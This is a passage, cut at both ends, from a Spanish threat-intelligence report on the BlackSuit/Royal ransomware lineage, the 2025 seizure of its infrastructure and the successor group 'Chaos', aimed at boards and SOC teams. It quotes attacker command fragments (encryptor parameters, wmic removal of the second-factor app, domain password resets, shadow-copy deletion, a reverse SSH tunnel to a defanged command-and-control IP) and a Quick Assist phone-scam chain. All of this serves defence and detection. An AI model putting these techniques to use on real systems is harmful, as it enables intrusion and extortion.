> prioridad. **El modelo es falso al menos en tres casos documentados de esta
> propia cartera.** Lo que ocurre es que la operación sucesora **se monta
> antes**, en paralelo, mientras la anterior todavía produce ingresos; y la
> intervención policial, cuando llega, acelera un traslado que ya estaba
> hecho. No hay ventana de respiro porque no hay reconstrucción: hay
> mudanza. La consecuencia defensiva es que **el día de una desarticulación
> es un buen día para buscar al sucesor, no para bajar la guardia**, y el
> `Anexo D` da la lista de dónde mirar.

---

# NIVEL ESTRATÉGICO
### Para: Consejo · CISO · Riesgo · Legal · Respuesta a Incidentes · Servicios al Usuario · Horizonte: 6–24 meses

## E-1. Qué consigue una acción policial, y qué no

Este expediente permite responder una pregunta que esta cartera no había tenido ocasión de plantear con datos: **¿qué efecto real tiene una desarticulación sobre una operación de extorsión?** La respuesta no es «ninguno» ni «se acabó», y la precisión importa porque de ella depende una decisión de prioridad.

**Qué se incautó, y a qué capacidad corresponde cada cosa.**

| Lo incautado | A qué capacidad del adversario pertenece | ¿Es reemplazable? |
|---|---|---|
| **Sitios de filtración** | A la **credibilidad de la amenaza de publicación**, que es el motor de la doble extorsión | Sí, pero no instantáneamente: un sitio nuevo no tiene historial, y el historial es lo que hace creíble la amenaza |
| **Portales de negociación** | A la **capacidad de cobrar** | Sí, en días |
| **Cuatro servidores y nueve dominios** | A la infraestructura de publicación y de contacto | Sí |
| **Más de un millón de dólares en criptomoneda** | A los **ingresos ya obtenidos** | **No.** Es la única pérdida irrecuperable |
| *(no incautado)* **Los operadores** | A **todo** | — |
| *(no incautado)* **Los accesos vigentes en redes de víctimas** | Al inventario de intrusiones en curso | — |
| *(no incautado)* **El código del cifrador y las herramientas** | A la capacidad técnica | — |

**La lectura es que la operación atacó la mitad del negocio y no tocó la otra.** Una operación de doble extorsión tiene dos máquinas: una que entra en redes y otra que convierte ese acceso en dinero mediante presión pública. `Operation Checkmate` desmontó la segunda y dejó intacta la primera. Eso es un resultado real —el dinero incautado no vuelve, y reconstruir reputación de sitio de filtración cuesta meses— y **no es lo mismo que detener la operación**.

**Y el dato que lo demuestra es cronológico.** El sucesor surgió en **febrero de 2025**; la incautación fue el **24 de julio de 2025**. Cinco meses de solapamiento. Dicho de otro modo: cuando llegó la intervención, **la mudanza ya estaba hecha**.

**Esta cartera tiene ya tres casos del mismo patrón, y los tres son de familias de adversario distintas:**

| Informe | Intervención | Cuándo apareció el reemplazo | Diferencia |
|---|---|---|---|
| `CTI-2026-036` | Red de bots desarticulada por orden judicial, **enero de 2024** | La red de retransmisión que la sustituyó estaba en marcha desde **noviembre de 2023** | **−2 meses** |
| **Este informe** | Infraestructura de extorsión incautada, **julio de 2025** | El grupo sucesor operaba desde **febrero de 2025** | **−5 meses** |
| `CTI-2026-037` | Operación de secuestro de DNS desarticulada, **abril de 2026** | *(no documentado)* — pero la operación anterior del mismo actor había sido desarticulada en febrero de 2024 y el linaje de desarrollo siguió | — |

**Tres casos no son una ley, pero el patrón es lo bastante consistente para cambiar una expectativa.** El modelo implícito en la pregunta «¿hubo reaparición?» es que una operación cae, se reconstruye y resurge, lo que produce la expectativa de una **ventana de respiro**. Lo que los tres casos muestran es que no hay reconstrucción porque **el reemplazo se monta antes, en paralelo, mientras la operación anterior todavía produce ingresos**. La intervención no abre una ventana: **acelera un traslado que ya estaba hecho**.

**La consecuencia de prioridad, y es contraintuitiva:** el día de una desarticulación no es un buen día para bajar la guardia; es un buen día para **buscar al sucesor**, porque es el día en que el mercado empieza a hablar de él y en que los afiliados se mueven. El `Anexo D` da la lista de dónde mirar.

**Y una consecuencia para el nivel estratégico que conviene no esquivar.** Si se juntan este informe y `CTI-2026-037`, el balance es que **cinco operaciones de dos familias de adversario terminaron por acción policial internacional, y ninguna por detección defensiva en una víctima**. Eso no es un reproche a nadie: es un dato de planificación sobre dónde está el rendimiento. La defensa propia realista contra estas operaciones no es detectarlas en su fase de mando y control —que es donde la industria concentra su gasto— sino **cerrar el vector inicial y limitar el alcance del cifrado**, que en este expediente son dos decisiones concretas: el procedimiento de la mesa de ayuda (`X-5.1`) y la segmentación de red (`X-5.4`).

## E-2. El control que no es de Seguridad: la mesa de ayuda

El vector de acceso inicial del sucesor no es una vulnerabilidad, ni un adjunto, ni una credencial robada. Es **una llamada de teléfono**, y la cadena completa es ésta:

1. Se **inunda a la víctima de correo basura**, en volumen suficiente para que piense que algo va mal.
2. El correo la **anima a llamar** a un número para resolverlo.
3. Cuando llama, el operador **se hace pasar por personal de seguridad informática**.
4. Le pide que abra **`Quick Assist`**, la herramienta de asistencia remota **que viene incluida en Windows**.
5. Y que **se conecte a la sesión del atacante**.

**No hay nada que detectar en los pasos 1 a 4.** El correo basura es correo basura; la llamada es una llamada; `Quick Assist` es un ejecutable firmado por Microsoft que existe en todos los equipos y cuyo uso legítimo es exactamente ése. El primer artefacto técnico aparece en el paso 5, cuando ya es tarde.

**Y el único control que corta la cadena está en el paso 3**, que es organizativo: **cómo verifica la organización quién llama cuando alguien dice ser soporte informático.** Ese control tiene tres propiedades que lo hacen el caso más puro del hueco que esta cartera persigue desde `CTI-2026-034`:

| Propiedad | Consecuencia |
|---|---|
| **No es propiedad de Seguridad.** Pertenece a Servicios al Usuario, a la mesa de ayuda, o está subcontratado a un tercero | No aparece en el inventario de controles de seguridad, no entra en la auditoría, y nadie lo prueba |
| **No es técnico**, de modo que no hay producto que comprarlo ni casilla que marcarlo | No se puede resolver con presupuesto, que es la vía por la que las organizaciones resuelven problemas de seguridad |
| **Y es bidireccional**, lo que casi nadie formula | No basta con que el usuario verifique al que llama: hace falta que **el usuario sepa que puede negarse**, y que negarse no tenga coste social con un supuesto superior técnico al teléfono |

**Las tres medidas que se siguen, y ninguna cuesta dinero:**

1. **Una regla enunciable en una frase y conocida por todos: «el soporte informático de esta organización nunca te pedirá que inicies una sesión de asistencia remota en una llamada que tú no has abierto por el canal oficial».** El énfasis está en *que tú no has abierto*: la asimetría entre una llamada entrante y una solicitud que el propio usuario registró es todo el control.
2. **Un canal oficial único y conocido para pedir soporte**, de modo que la frase anterior tenga referente. Si hay cinco formas de pedir ayuda, no hay ninguna.
3. **Y permiso explícito para colgar.** Es la parte que se omite y la que decide: la ingeniería social por voz funciona por presión de autoridad y urgencia, y un usuario que no sabe si puede colgarle a alguien que dice ser de seguridad informática no va a colgar.

> **Por qué esto está en el nivel estratégico y no en el técnico.** Porque las
> tres medidas exigen una decisión de alguien que no es el CISO —el dueño de
> la mesa de ayuda— y porque la tercera exige una señal de Dirección. Un
> informe de inteligencia puede documentar el vector; no puede dar permiso
> para colgar.

## E-3. Lo que el sucesor hace mejor, y qué decisión cambia cada cosa

El sucesor no es una copia degradada del predecesor: es mejor en tres aspectos medibles, y cada uno mueve una decisión distinta.

| Mejora | Qué era antes | Qué es ahora | Qué decisión cambia |
|---|---|---|---|
| **Alcance de plataforma** | Foco en Windows | Se anuncia compatible con **Windows, ESXi, Linux y almacenamiento en red** | **El hipervisor y el almacenamiento en red entran en el alcance del plan de recuperación.** Un plan que asume que el cifrado ocurre en servidores Windows y que la plataforma de virtualización es el refugio ha dejado de ser válido |
| **Criptografía por fichero** | Cifrado parcial con porcentaje elegible | Lo mismo, **más una clave distinta por fichero** derivada por acuerdo de claves de curva elíptica combinado con la clave maestra del operador | **La recuperación sin la clave del operador deja de ser concebible.** Donde un esquema con clave única admite la esperanza de un fallo de implementación, uno con clave por fichero no. La única vía es la copia de seguridad |
| **Propagación por red** | Movimiento lateral manual, con RDP, PsExec y SMB | **El propio cifrador** enumera interfaces, identifica rangos privados, **genera la lista de todos los anfitriones de cada subred**, se conecta por SMB y encola los recursos compartidos | **La contención pasa a ser una carrera, y la segmentación pasa de buena práctica a factor decisivo del alcance del daño.** Es `X-5.4` |

**Y una cuarta diferencia que no es de capacidad sino de modelo de negocio, y conviene verla.** El predecesor era una operación cerrada. El sucesor es **extorsión como servicio**: se promociona en un foro buscando afiliados, con panel automatizado de gestión y **una cuota de entrada que se devuelve con el primer cobro**. Eso tiene dos implicaciones opuestas para el defensor:

- **A favor:** un modelo de afiliados introduce **variabilidad de competencia**. No todos los afiliados son igual de buenos, y eso significa que una parte de las intrusiones será más ruidosa y más detectable que la del equipo original.
- **En contra:** multiplica el **volumen** y desacopla la víctima de la intención. Una operación cerrada elige a quién atacar; un programa de afiliados ataca a quien cada afiliado alcance. Y la lista de exclusiones de `KJ-6` es, precisamente, el único mecanismo con el que la marca intenta controlar a sus afiliados — lo que explica por qué está publicada.

## E-4. La lista de exclusiones, y cómo leerla sin creerla ni descartarla

El sucesor declara en su anuncio de reclutamiento que **evita expresamente colaborar con países BRICS y de la Comunidad de Estados Independientes, con hospitales y con entidades de gobierno**. Para esta región eso significa que **Brasil está cubierto por pertenencia a BRICS y ningún otro país lo está**.

**Es una declaración del adversario, y una declaración del adversario no es un hecho. Pero tampoco es ruido**, y conviene separar las tres cosas que puede estar haciendo a la vez:

| Qué función cumple la lista | Para quién | ¿La hace más o menos creíble? |
|---|---|---|
| **Evitar jurisdicciones con capacidad de perseguir o de retaliar** | Para los operadores | **Más creíble**: es interés propio, y el interés propio es la razón más fiable del mundo |
| **Hacerse atractivo ante afiliados de ciertos países**, que no quieren atacar en casa | Para el reclutamiento | **Más creíble**, por lo mismo |
| **Señalar alineamiento político para reducir atención** | Para el público | **Menos creíble**: una declaración hecha para ser leída por terceros es la que menos obliga |
| **Y una cuarta, que es la que importa:** disciplinar a los afiliados | Para la marca | **Creíble pero frágil**: un programa de afiliados sólo puede imponer su lista con la amenaza de expulsar, y la expulsión llega después del ataque |

**La valoración de este informe es que la exclusión de Brasil es *probable* en la práctica, y por la primera y la segunda razones, no por la tercera.** Pero la cuarta fila es la que define cómo usarla: en un modelo de afiliados, **la lista describe la política de la marca y no la conducta garantizada de cada operador**, y la sanción es posterior al daño. Una organización brasileña tiene un argumento declarado a su favor; no tiene una garantía.

**Y la asimetría es la conclusión útil, porque es accionable para la mayor parte de la región:** una organización chilena, colombiana, mexicana, peruana o argentina **no tiene ni ese argumento**. Si alguien en esos países estaba apoyándose, aunque fuera implícitamente, en la idea de que estas operaciones se concentran en Estados Unidos y Europa —que es lo que la victimología publicada del sucesor sugiere: predominantemente Estados Unidos, con menos en Reino Unido, Nueva Zelanda e India—, conviene saber que **la ausencia de víctimas publicadas y la ausencia de exclusión declarada apuntan en direcciones opuestas**, y que la segunda es la que depende del adversario.

> **Y un disparador de revisión que se sigue de esto, y es inusualmente
> nítido:** si aparece **una víctima brasileña** de este grupo, la lista de
> exclusiones queda refutada como política efectiva y pasa a ser propaganda.
> Ese dato cambiaría el juicio para toda la región, y es `I-2`.

## E-5. Decisiones que este informe pide al nivel estratégico

1. **Escribir, difundir y hacer cumplir la regla de la mesa de ayuda.** `E-2`. Es el único control que corta el vector inicial del sucesor, no cuesta dinero, y exige una decisión de alguien que no es el CISO. *Coste: organizativo, y una señal de Dirección sobre el permiso para colgar.*
2. **Revisar que el plan de recuperación cubra el hipervisor y el almacenamiento en red**, no sólo los servidores Windows. El cifrador del sucesor se anuncia compatible con las cuatro plataformas. *Coste: una revisión del plan, y posiblemente un cambio en la arquitectura de copias.*
3. **Tratar la segmentación de red como el factor que decide el alcance del daño, no como una buena práctica.** El cifrador enumera y encola los anfitriones de cada subred por sí mismo. *Coste: proyecto, y es el más caro del informe.*
4. **Limpiar las seis direcciones de `A.5` de cualquier lista de bloqueo en la que hayan entrado.** Son rangos de banda ancha de operadores colombianos y argentinos, el propio aviso oficial pide investigarlas antes de bloquear, y bloquearlas corta tráfico legítimo. *Coste: una consulta a quien administra el perímetro.*
5. **Inventariar y gobernar las herramientas de administración remota.** El sucesor persiste instalando **AnyDesk, ScreenConnect, OptiTune, Syncro RMM y Splashtop**, que son productos legítimos. La pregunta no es cuáles están prohibidas: es **cuáles están aprobadas, y qué pasa cuando aparece una que no lo está**. *Coste: un inventario y una política.*
6. **No bajar la prioridad de este expediente por la desarticulación.** `E-1`. El día de una acción policial es un buen día para buscar al sucesor. *Coste: cero; es una decisión de encuadre.*
7. **No adquirir nada por este informe.** Las cinco mitigaciones de `X-5` son de configuración y de procedimiento, salvo la segmentación, que es arquitectura y no un producto de seguridad. *Coste: cero en licencias.*

---

# NIVEL OPERACIONAL
### Para: Jefatura de SOC · Respuesta a Incidentes · Threat Hunting · Mesa de Ayuda · Horizonte: semanas–meses

## O-1. Identificación y alias

| Designación | Quién la usa | Nota |
|---|---|---|
| **BlackSuit** | FBI y CISA, en `AA23-061A` | **La designación del aviso oficial**, usada en todo el documento desde la revisión del 2024-08-07 |
| **Royal** | FBI y CISA, para la actividad anterior | **No es un alias: es la generación previa**, usada de septiembre de 2022 a junio de 2023. El aviso mantiene el nombre sólo «cuando se refiere a actividad heredada de Royal» |
| Conti | Uso general | **El origen del linaje, y el eslabón más débil del expediente**: lo sostienen la prensa especializada y los perfiles de actor, **no el aviso oficial** (§3.5, punto 2) |
| **`Chaos`** | Cisco Talos | **El sucesor**, y **no es un alias de BlackSuit**: es un grupo distinto que Talos valora con **confianza moderada** como su continuación o como obra de antiguos miembros |
| `Chaos` *(constructor)* | Uso histórico | ⚠ **Colisión de nombre deliberada.** Talos declara expresamente que el grupo nuevo **no tiene relación** con las variantes producidas por la herramienta constructora llamada Chaos ni con sus desarrolladores, y que el grupo **usa el mismo nombre para crear confusión** |

> ⚠ **La última fila es una advertencia operativa, no una curiosidad
> taxonómica.** Talos lo dice con claridad: «para ocultar su identidad, estos
> actores han explotado la confusión en la comunidad de seguridad respecto al
> nombre "Chaos" y sus variantes y herramientas constructoras asociadas». Es
> decir, **el adversario eligió un nombre ya ocupado a propósito**, para que
> una búsqueda de «Chaos ransomware» devuelva material de otra cosa y para
> que los indicadores se mezclen. Esta cartera tiene tres informes
> —`CTI-2026-017`, `022` y `030`— que existen porque alguien compuso cosas
> distintas con el mismo nombre; aquí la composición **es un objetivo del
> adversario**, y es la primera vez que esta cartera documenta una colisión
> de nombres **intencionada**. `CTI-2026-035` desambiguó cuatro cosas
> llamadas «Medusa» que coincidían por accidente; esto no es un accidente.

## O-2. Estructura y atribución

### O-2.1 — Grado de establecimiento

| Afirmación | Base | Grado |
|---|---|---|
| BlackSuit es la evolución de Royal, con numerosas similitudes de código | `AA23-061A`, declaración del FBI y CISA | **Oficial** |
| Las demandas iban de 1 a 10 millones de dólares, con más de 500 millones exigidos en total y un máximo individual de 60 millones | `AA23-061A` | **Oficial** |
| Usaba **cifrado parcial con porcentaje elegible por el actor** | `AA23-061A` | **Oficial** |
| Hubo un aumento de **comunicaciones telefónicas** de los actores con las víctimas | `AA23-061A`, revisión de agosto de 2024 | **Oficial** |
| La infraestructura fue incautada el 2025-07-24 en `Operation Checkmate` | Cobertura especializada consistente; **sin comunicado oficial detallado localizado** (`G-2`) | **Oficial por referencia** |
| **No hubo detenciones** | Las propias fuentes de la cobertura lo señalan expresamente | **Oficial por referencia** |
| Royal procede de Conti | Prensa especializada y perfiles de actor; **el aviso oficial no lo afirma** | **Proveedor** |
| `Chaos` surgió en febrero de 2025 | `B-2`, Cisco Talos Incident Response | **Proveedor, de primera mano** |
| `Chaos` es BlackSuit o sus antiguos miembros | `B-2`, **confianza moderada declarada** | **Proveedor, confianza moderada** |
| La similitud de metodología de cifrado es el **porcentaje elegible** | **Inferencia propia** sobre `AA23-061A` y `B-2` | **Propio, confianza moderada** (`KJ-4`) |
| El uso del teléfono para entrar es desarrollo del uso del teléfono para cobrar | **Inferencia propia** | **Propio, confianza moderada** (`KJ-5`) |
| El parámetro `/ignorar_arquivos_grandes` está en portugués | **Observación propia** sobre literal de `B-2` | **Propio, confianza baja** (`KJ-9`) |
| Cinco de las seis direcciones latinoamericanas del aviso son banda ancha | **Verificación propia por RDAP a LACNIC, 2026-11-19** | **Propio, verificado** (`KJ-7`) |
| Hubo víctimas latinoamericanas | **Nada** | **Sin evidencia** |

### O-2.2 — El mecanismo del vínculo, paso a paso

Talos declara que su valoración se apoya en «similitudes en la metodología de cifrado del *ransomware*, la estructura de la nota de rescate y el conjunto de herramientas usado en los ataques», y **no detalla la primera**. Este apartado la detalla, porque hacerlo convierte una valoración en algo comprobable.

**Lo que dice el aviso oficial sobre el predecesor:**

> «BlackSuit usa un enfoque de cifrado parcial único que permite al actor
> **elegir un porcentaje específico de datos de un fichero a cifrar**. Este
> enfoque permite al actor bajar el porcentaje de cifrado para ficheros más
> grandes, lo que ayuda a evadir la detección y además mejora
> significativamente la velocidad del *ransomware*.»

**Lo que dice el análisis del sucesor:** el cifrador recibe, en la línea de órdenes del operador, estos parámetros:

```
Encryptor.exe /lkey:"clave de 32 bytes" /encrypt_step:$0-100
              /work_mode:$modo /ignorar_arquivos_grandes
```

con `/encrypt_step` documentado como «**porcentaje de cifrado selectivo**, con 30 % por omisión», y una opción separada de **tratamiento de ficheros grandes**.

**La correspondencia es punto por punto:**

| Lo que describe el aviso oficial del predecesor | Cómo aparece en el sucesor |
|---|---|
| El actor **elige** el porcentaje | `/encrypt_step`, parámetro de línea de órdenes |
| Se **baja** el porcentaje para ficheros grandes | `/ignorar_arquivos_grandes`, opción separada |
| Para **evadir la detección** | — |
| Y para **mejorar la velocidad** | «calcula desplazamientos específicos del fichero para optimizar la velocidad de cifrado con corrupción completa del fichero» |

**Tres observaciones sobre esta correspondencia, y la tercera es la que la hace valiosa:**

1. **No es una coincidencia de concepto.** El cifrado parcial lo hacen muchas familias; lo que aquí coincide es que el **porcentaje sea un parámetro del operador**, con un valor por omisión, más una opción separada para ficheros grandes. Eso es una decisión de diseño de interfaz, no de criptografía.
2. **El aviso oficial lo llama «único»**, lo que es una afirmación fuerte de una fuente gubernamental sobre la singularidad del mecanismo en el momento de escribirlo.
3. **Y es refutable en quince minutos.** Cualquiera puede leer los dos documentos y romper la correspondencia si hay otra explicación. Eso es la diferencia entre esta inferencia y una valoración que hay que aceptar: `KJ-4` está escrito para ser atacado, y el `Anexo H` lo pide expresamente.

**Y el segundo elemento de continuidad, que es de conducta y no de código.** El aviso oficial anota en agosto de 2024 «un aumento en el número de casos en los que las víctimas recibieron comunicaciones **telefónicas** o por correo de actores de BlackSuit sobre el compromiso y el rescate». El sucesor usa **la llamada como vector de entrada**. La secuencia natural —primero normalizar hablar por teléfono con la víctima para cobrar, después usar el mismo canal para entrar— es una inferencia nuestra, valorada como *probable*, y tiene una consecuencia práctica que ninguna de las dos fuentes enuncia: **el adversario tiene operadores con capacidad de ingeniería social por voz en el idioma de la víctima**, y eso es un recurso humano, no una herramienta. No se compra en un foro, y por tanto **no se pierde en una incautación de servidores**.

### O-2.3 — Los cinco informes de extorsión de esta cartera, y qué los separa

| | `CTI-2026-014` TheGentlemen | `CTI-2026-015` Qilin | `CTI-2026-016` LockBit 5.0 | `CTI-2026-024` Rhysida | `CTI-2026-035` Medusa | **Este informe** |
|---|---|---|---|---|---|---|
| Modelo | Operación | RaaS | RaaS | RaaS con **actores de acceso asociados** | RaaS | Operación → **RaaS** |
| Estado | Activa | Activa | Activa | Activa | Activa | **Desarticulada; continuada por otro nombre** |
| Vector distintivo | — | — | — | Acceso de terceros | **Exploits antes de la divulgación** | **Llamada telefónica suplantando a soporte** |
| Linaje declarado | — | — | Sí | Solapamientos | — | **Conti → Royal → BlackSuit → `Chaos`** |
| Exclusiones declaradas | — | — | — | — | — | **BRICS, CEI, hospitales, gobierno** |

> **Lo que este informe añade al conjunto y no estaba:** es el único de los
> seis cuyo objeto es **una operación que terminó**, y por tanto el único que
> permite preguntarse qué significa que una operación termine. Los otros
> cinco describen adversarios vivos; éste describe una transición, y la
> transición resulta ser más informativa que cualquiera de los dos estados.

## O-3. Modelo de operación

### O-3.A — La cadena del predecesor, según el aviso oficial

| Fase | Qué ocurre |
|---|---|
| **Acceso inicial** | **Suplantación por correo** es el vector más común, con PDF maliciosos y publicidad maligna. Después, **RDP (~13,3 % de los incidentes)**; aplicaciones expuestas a Internet; y **corredores de acceso** que cosechan credenciales de red privada virtual de registros de ladrones |
| **Mando y control** | `Chisel`, clientes de SSH, `PuTTY`, `OpenSSH`, `MobaXterm` |
| **Movimiento lateral** | RDP, `PsExec` y SMB. En un caso confirmado, **una cuenta de administrador legítima** para entrar al controlador de dominio por SMB, y allí **desactivar el antivirus modificando objetos de directiva de grupo** |
| **Persistencia** | **Herramientas legítimas de administración remota**, más `SystemBC` y `Gootloader` |
| **Descubrimiento y credenciales** | `SharpShares`, `SoftPerfect NetWorx`, `Mimikatz`, herramientas de cosecha de contraseñas de Nirsoft, y `PowerTool` y `GMER` para matar procesos |
| **Exfiltración** | `Cobalt Strike`, derivados de `Ursnif`/`Gozi`, **`RClone`** y `Brute Ratel`. **El primer salto de la exfiltración suele ser una dirección estadounidense** |
| **Preparación del cifrado** | **Gestor de reinicio de Windows** para saber si los ficheros objetivo están en uso; **`vssadmin.exe`** para borrar copias de sombra |
| **Automatización** | Numerosos ficheros **`.bat`** transferidos como un **7zip cifrado**, que crean un administrador nuevo, fuerzan actualización de directiva de grupo, ponen claves de registro de autoextracción, ejecutan el cifrador, vigilan el proceso y **borran los registros de aplicación, sistema y seguridad al terminar** |

### O-3.B — La cadena del sucesor, fase por fase

| Fase | Qué ocurre | Dónde queda rastro |
|---|---|---|
| **Preparación** | **Inundación de correo basura** de bajo esfuerzo | Pasarela de correo: un pico de volumen hacia un buzón |
| **Acceso inicial** | **Llamada telefónica**: el operador suplanta a seguridad informática y pide lanzar **`Quick Assist`** y conectarse a su sesión | **Ejecución de `quickassist.exe`** y una sesión entrante |
| **Descubrimiento** | `ipconfig /all`, `nltest /dclist`, `nltest /domain_trusts`, `nslookup`, `net view`, `quser.exe`, `tasklist.exe` | Línea de órdenes de procesos |
| **Ejecución** | PowerShell para fijar el directorio de trabajo; **abuso de la optimización de entrega de Windows** en el puerto local 8005 para distribuir ficheros de más de 50 MB entre pares de la red; `atexec` de Impacket | Línea de órdenes, y tráfico interno en 8005 |
| **Persistencia** | **Cinco herramientas legítimas de administración remota**: AnyDesk, ScreenConnect, OptiTune, Syncro RMM, Splashtop. Más una cuenta de usuario **oculta de la pantalla de inicio** por `SpecialAccounts\Userlist`, y **restablecimiento de contraseñas de cuentas de dominio** con `net.exe user ... /dom` | Instalación de software, registro, y **cambios de contraseña masivos** |
| **Credenciales** | `ldapsearch` ejecutado **a través del túnel inverso de SSH**, volcado del directorio activo a un fichero de texto, y probable *kerberoasting* | Consultas LDAP anómalas |
| **Evasión** | **Borrado de los registros de eventos de PowerShell**; e intento de **desinstalar la aplicación de segundo factor** con `wmic product ... call uninstall /nointeractive` | **La desinstalación del segundo factor es la señal de oro** |
| **Movimiento lateral** | RDP, SSH, SMB, Impacket; y `wmic /node:... process call create` para lanzar el cifrador en remoto | Creación de procesos remotos |
| **Exfiltración** | **`GoodSync`**, software legítimo de sincronización; y una herramienta de subida a nube **renombrada `wininit.exe`**, con filtrado por antigüedad —**sólo ficheros modificados en el último año**— y exclusión de veinte extensiones | Tráfico saliente a almacenamiento en nube |
| **Mando y control** | **Túnel inverso de SSH** con el cliente `OpenSSH` de Windows contra `45.61.134[.]36` **en el puerto 443**, con reenvío del puerto 12840 y comprobación de huella deshabilitada | Conexión saliente a 443 **que no es TLS** |
| **Impacto** | Borrado de copias de sombra con un `vssadmin` **ofuscado carácter a carácter**; cifrado selectivo con `/encrypt_step`; extensión `.chaos`; nota `readme.chaos.txt` | — |

### O-3.C — Las tres decisiones de diseño que delatan al operador

**La primera: la exfiltración es selectiva, y lo que excluye es lo interesante.** La orden de subida filtra **sólo ficheros modificados en el último año** y excluye veinte extensiones, entre ellas:

- `pst` — **archivos de correo de Outlook**
- `mdb` — **bases de datos**
- `vhdx` — discos duros virtuales
- `iso`, `7z`, `psd`, `dwg`, `mov`, `wav`, `png`, `heic` — medios, comprimidos y diseño
- `exe`, `dll`, `msi`, `log`, `tmp`, `db`

**Eso no es lo que hace una operación de doble extorsión típica**, que se lleva todo lo que pueda usar como palanca, archivos de correo incluidos. Lo que describe este filtro es **documentos de oficina recientes y nada más**: ni correo, ni bases de datos, ni imágenes de disco. La explicación que la propia fuente ofrece es de evasión —«posiblemente para evitar ficheros grandes o sensibles que puedan disparar la detección»— y es razonable. **Y tiene una consecuencia defensiva útil**: una organización cuyo activo crítico esté en un archivo de correo o en una base de datos **no perdería ese activo en esta exfiltración**, aunque sí lo perdería en el cifrado. Es una distinción que importa al evaluar el daño real de un incidente.

**La segunda: el abuso de la optimización de entrega de Windows.** El operador configura el servicio de optimización de entrega para distribuir, **entre los propios equipos de la red de la víctima**, ficheros de más de 50 MB servidos desde el puerto local 8005. Es decir: **usa la infraestructura de distribución de parches de la víctima para repartir sus propias herramientas**. No es sigilo, es eficiencia — y es una señal específica, porque la optimización de entrega apuntando a un servidor local en un puerto no estándar no tiene uso legítimo.

**Y la tercera: el túnel inverso de SSH por el puerto 443.** El operador usa el cliente `OpenSSH` **que viene con Windows** para abrir un túnel inverso contra su servidor, **en el puerto 443 en lugar del 22**, con `StrictHostKeyChecking=no` y sin guardar la clave del anfitrión. La elección del 443 es para atravesar el perímetro; la de `OpenSSH` nativo, para no instalar nada.

> **La detección que se sigue de la tercera es de las mejores del informe,
> porque es de origen y de forma, no de destino:** una conexión saliente al
> puerto 443 **que no negocia TLS** sino SSH, originada por
> `C:\Windows\System32\OpenSSH\ssh.exe`, en un puesto que no es de
> administración de sistemas. Tres condiciones, cada una con falsos positivos
> y las tres juntas sin ninguno conocido.

## O-4. Nuestra exposición

### O-4.1 — El cuestionario, por orden de lo que decide

| # | Pregunta | A quién se pregunta | Por qué decide |
|---|---|---|---|
| 1 | ¿Existe y se conoce una regla sobre **sesiones de asistencia remota pedidas en una llamada entrante**? | Mesa de Ayuda + Servicios al Usuario | **Es el único control que corta el vector inicial** (`E-2`). Y si la respuesta es «no hay regla», ése es el hallazgo del informe |
| 2 | ¿Qué herramientas de administración remota están **aprobadas**, y qué ocurre cuando aparece una que no lo está? | Sistemas + Seguridad | El sucesor persiste con **cinco productos legítimos**. La pregunta útil no es qué está prohibido: es qué está aprobado |
| 3 | ¿Está **`Quick Assist`** disponible en los puestos, y se necesita? | Plataforma de dispositivos | Si no es requisito, **restringirlo elimina el paso 4 de la cadena** |
| 4 | ¿Alertamos sobre la **desinstalación de la aplicación de segundo factor** o de controles de seguridad por `wmic`? | SOC | Es la señal de oro de la fase de evasión, y casi nadie la vigila |
| 5 | ¿Nuestro plan de recuperación cubre **hipervisores y almacenamiento en red**, o sólo servidores Windows? | Infraestructura | El cifrador se anuncia compatible con las cuatro plataformas (`E-3`) |
| 6 | ¿Cómo está **segmentada la red**, y cuántos anfitriones alcanzaría un cifrador que enumere su propia subred? | Redes | **Decide el alcance del daño**, no la probabilidad del incidente |
| 7 | ¿Alertamos sobre **cambios masivos de contraseña de cuentas de dominio**? | SOC + Identidad | `net.exe user ... /dom` sobre cuentas enumeradas es persistencia, y es ruidosa si alguien escucha |
| 8 | ¿Hay alguna de las **seis direcciones de `A.5`** en una lista de bloqueo nuestra? | Perímetro | **Si la hay, hay que quitarla**: son rangos de banda ancha de operadores de la región (`KJ-7`) |
| 9 | ¿Está **`GoodSync`** o alguna herramienta de sincronización no aprobada instalada en algún servidor? | Sistemas | Es el instrumento de exfiltración documentado, y es software legítimo |
| 10 | ¿Somos una organización **brasileña**? | — | Es la única pregunta de este cuestionario cuya respuesta cambia el juicio de exposición, y la respuesta no se puede modificar (`E-4`) |

### O-4.2 — Qué se puede medir hoy

1. **Preguntar a la mesa de ayuda si existe la regla.** Una pregunta, respuesta inmediata, y decide la medida más importante del informe.
2. **Buscar `quickassist.exe` ejecutado en los últimos doce meses**, y para cada caso preguntar si hubo una llamada. Es la consulta de `X-4`, y es barata.
3. **Buscar las seis direcciones de `A.5` en las listas de bloqueo propias** y quitarlas si están.
4. **Inventariar las cinco herramientas de administración remota de `A.6`** en el parque. No para bloquearlas: para saber cuáles hay y quién las aprobó.

## O-5. Cronología

| Fecha | Hecho | Fuente | Grado |
|---|---|---|---|
| **2022-09 → 2023-06** | Actividad bajo el nombre **Royal** | `B-1` | **Oficial** |
| **2023-03-02** | Primera publicación del aviso conjunto `AA23-061A` | `B-1` | **Oficial** |
| **2023-06** | Transición de Royal a **BlackSuit** | `B-1` | **Oficial** |
| **2023-11-13** | Primera revisión del aviso, con nuevas TTP e indicadores de Royal | `B-1` | **Oficial** |
| **2024-07** | Fecha de los datos más recientes de la revisión siguiente | `B-1` | **Oficial** |
| **2024-08-07** | **Revisión del aviso que documenta el cambio de nombre a BlackSuit**, con nuevas TTP, indicadores y métodos de detección. **Y la nota del aumento de comunicaciones telefónicas con las víctimas** | `B-1` | **Oficial** |
| **2024-08-14 / 2024-08-27** | Dos refrescos de los paquetes STIX del aviso | `B-1` | **Oficial** |
| **2025-02** | **`Chaos` surge, según Talos**: «tan pronto como febrero de 2025» | `B-2` | **Proveedor** |
| **2025-02 / 03 / 05** | Fechas de compilación de las muestras del cifrador de Windows analizadas | `B-2` | **Proveedor** |
| **2025-07-24** | **`Operation Checkmate`: incautación de los sitios de filtración y los portales de negociación de BlackSuit.** Cuatro servidores, nueve dominios, más de un millón de dólares. Departamento de Justicia y dieciséis agencias de nueve países. **Cero detenciones** | `B-3` | **Oficial por referencia** |
| **2025-07-24** | **El mismo día**, Cisco Talos publica el análisis de `Chaos` | `B-2` | **Proveedor** |
| **2026-11-19** | **Verificación propia por RDAP** de las seis direcciones latinoamericanas del aviso | `B-5` | **Propio, verificado** |
| **2026-11-19** | Emisión de este informe | — | — |

> **La fila doble del 24 de julio de 2025 es la cronología entera del informe
> en una línea.** El mismo día en que una coalición de dieciséis agencias
> incautó la infraestructura de una operación de extorsión, un equipo de
> respuesta a incidentes publicó el perfil de su sucesor, que llevaba cinco
